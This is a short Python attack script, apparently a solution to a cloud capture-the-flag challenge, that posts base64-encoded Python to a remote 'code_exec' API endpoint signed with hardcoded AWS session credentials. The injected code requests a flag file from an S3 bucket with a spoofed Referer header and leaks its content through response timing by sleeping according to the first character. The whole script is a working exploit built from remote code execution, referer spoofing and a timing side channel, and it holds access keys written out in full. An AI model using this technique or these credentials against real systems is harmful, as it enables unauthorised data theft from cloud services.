import requests
import base64
import time
from aws_requests_auth.aws_auth import AWSRequestsAuth

auth = AWSRequestsAuth(aws_access_key="ASIARYWSMSYIIWK4BEMG",
                       aws_secret_access_key="yQXeKSwcKm2sMkj34DVhMhzMAQ/U+U1en5S4xmsd",
                       aws_token="IQoJb3JpZ2luX2VjELj//////////wEaDGlsLWNlbnRyYWwtMSJGMEQCIDF7JGpYPE2Awtt7TrTdowno6OzcS1UBLm1VG22edZvjAiAv6CKYlLqEA5XGHTjHC7Zd31GU07fTZIRT5h7wSS8G/Cq1AgglEAAaDDEyMTc3NDA1Mjg4MCIM8Ws5xRwIAZJyZCjjKpICTQVLdf5ZWWgYfpiwvtdLAL0/+M0Ni6LskzqCorBijcWaC1N3cRkuqy3kc12VA7NtjK/D7SCZmtYRDNt5pbZnvg48BZqtjY8gr0EMWKU0Y3ihq4VRkG9Ey73csFLx+gsgxkvyK6Bv9O4tVKZbTVrQ305DcAKTL2zpTB86uM9TGG/Y7D72CqrKLYPlYl2n2QK1Wyc46WaM/CakboW6J9IxNlIVGymn6hm1gdxC/nk7YShxnCg9Kh3rPwquB0axT85cSeVOVX3a6quCb1+fVY5PT4flf4y216WIRqyPDFywpQVxEC769cf/4zu6LOKWbTPaK18wFRu+XXVw/XbkPE+dBb9MqbtaP4tKSD6rmD5fqCrlwDCCw8zTBjqeAcYMGqS2qPpmzSR6yQkw5yPW14q0kin4++AZfBFJS0gZta7D90stYQPFM0+OsMz1yqfueBMihYUxZblCv2kj5nQLpPMPSMSx9gL/PKZtTO5+fRdOMtkjPWsdF3Z6O+Y37DDagfhoUmrMUoBTWBZLdenZp00N2Wb9oGwCMq1oRYjVnqoQjNABxqiaRSP/m1T1LN5hFw7DBYkgkvIQ1DVT",
                       aws_host='l8ssyaz69f.execute-api.us-east-1.amazonaws.com',
                       aws_region='us-east-1',
                       aws_service='execute-api')

URL = "https://l8ssyaz69f.execute-api.us-east-1.amazonaws.com/dev/code_exec"

def test_referer():
    code = f"""
import urllib.request
import time

try:
    req = urllib.request.Request('https://s3.us-east-1.amazonaws.com/userd8a2f72fe43094e8/flag.txt', headers={{
        'Referer': 'https://d4ysu55xg7wfi.cloudfront.net/index.html'
    }})
    val = urllib.request.urlopen(req, timeout=3).read().decode('utf-8')
except Exception as e:
    val = type(e).__name__ + ":" + str(e)

if val.startswith('M'):
    time.sleep(3.0)
elif val.startswith('H'):
    time.sleep(1.0)
"""
    encoded_code = base64.b64encode(code.encode('utf-8')).decode('utf-8')
    start = time.time()
    try:
        requests.post(URL, json={"code": encoded_code}, auth=auth, timeout=10)
    except Exception as e:
        print(e)
    elapsed = time.time() - start
    print(f"Elapsed: {elapsed:.2f}")

test_referer()
